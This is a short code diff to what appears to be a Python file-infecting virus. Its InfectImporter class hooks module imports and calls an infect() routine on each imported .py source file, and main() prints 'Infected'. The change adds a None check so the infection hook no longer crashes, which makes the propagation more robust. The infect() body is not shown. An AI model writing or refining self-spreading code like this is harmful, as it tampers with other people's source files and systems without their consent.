@@ -67,11 +67,10 @@ class InfectImporter():
         if not self.inside:
             self.inside = True
             spec = importlib.util.find_spec(name, path)
-            if spec.origin and spec.origin != 'built-in' and spec.origin.endswith('.py'):
+            if spec and spec.origin != 'built-in' and spec.origin and spec.origin.endswith('.py'):
                 infect(spec.origin)
             self.inside = False
         return None
-
 
 def main():
     print("Infected")
